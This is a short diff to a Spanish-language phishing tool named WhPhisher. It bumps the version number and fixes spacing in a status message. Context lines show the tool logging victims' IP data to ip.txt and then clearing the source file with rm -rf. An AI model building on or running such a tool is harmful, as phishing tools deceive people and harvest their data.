@@ -246,7 +246,7 @@ def about():
     system("clear")
     slowprint(logo)
     print(bcyan+'[Nombre de la herramienta]  '+bpurple+' :[WhPhisher] ')
-    print(bcyan+'[Version]   '+bpurple+'                 :[2.2]')
+    print(bcyan+'[Version]   '+bpurple+'                 :[2.4]')
     print(bcyan+'[Author]    '+bpurple+'                 :[WhBeatZ] ')
     print(bcyan+'[Github]    '+bpurple+'                 :[https://github.com/WhBeatZ] ')
     print(bcyan+'[Instagram] '+bpurple+'                 :[WhBeatZ]  ')
@@ -807,7 +807,7 @@ def waiter():
                         print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                         h+=1
                 print("\n"+info+"Guardado en ip.txt")
-                print("\n"+info+blue+"Esperando mas informacion"+cyan+ "Pulsa "+red+ "Ctrl+C"+cyan+" para salir")
+                print("\n"+info+blue+"Esperando mas informacion "+cyan+ "Pulsa "+red+ "Ctrl+C"+cyan+" para salir")
                 system("cat $HOME/.site/ip.txt >> ip.txt")
                 os.system("rm -rf $HOME/.site/ip.txt")
             sleep(0.75)
